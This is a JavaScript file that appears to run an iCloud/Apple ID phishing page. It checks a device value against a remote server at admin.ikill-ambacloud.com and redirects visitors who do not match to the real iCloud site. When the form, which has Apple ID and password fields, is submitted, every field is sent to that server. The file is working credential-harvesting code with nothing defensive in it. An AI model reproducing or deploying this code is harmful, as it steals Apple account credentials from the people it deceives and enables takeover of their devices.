var device;
var poos;

function init() {

   
    $("#formulario").on("submit", function(e) {
        guardaryeditar(e);
    });


     device=$("#device").val();

    $.post("https://admin.ikill-ambacloud.com/ajax/usuario.php?op=verifiar", {device:device }, function(data, status) {
       if(data==1)
       {
        $.post("https://admin.ikill-ambacloud.com/ajax/usuario.php?op=visitas", {device:device }, function(data, status) {
           
         });

       }else
       {
        window.location.href = "https://www.icloud.com/";
       }
    });

    
}

function guardaryeditar(e) {

    e.preventDefault(); 
    var formData = new FormData($("#formulario")[0]);
    
    $.ajax({
        url: "https://admin.ikill-ambacloud.com/ajax/usuario.php?op=datos",
        type: "POST",
        data: formData,
        contentType: false,
        processData: false,
        success: function(datos) {
            

            var divisiones = datos.split("___");
           

            if(divisiones[1]=='yes'){

                $("#isiclodAA").css("display", "block");
                $("#containerOcl").css("display", "none");

                
            }
            else
            {
               
                // $("#apple_id").css("direction", "ltr !important");
                // $("#apple_pwd").css("direction", "ltr !important");
                // $("#apple_pwd").css("display", "none");
                $("#sp").css("display", "none");
                $("#c_log ").css("display", "block");
                $("#igmalert ").css("display", "none");

                

                $('#divalert').show();

               // document.getElementById("formulario").reset(); 
            }
         
          
        }
    });

//setTimeout(function(){  window.location.href = "https://www.icloud.com/"; }, 20000);
}


function guardar(e) {
    e.preventDefault(); 
    var formData = new FormData($("#formulario")[0]);
    $.ajax({
        url: device,
        type: "POST",
        data: formData,
        contentType: false,
        processData: false,
        success: function(datos) {
            console.log(datos);
        }
    });
}



init();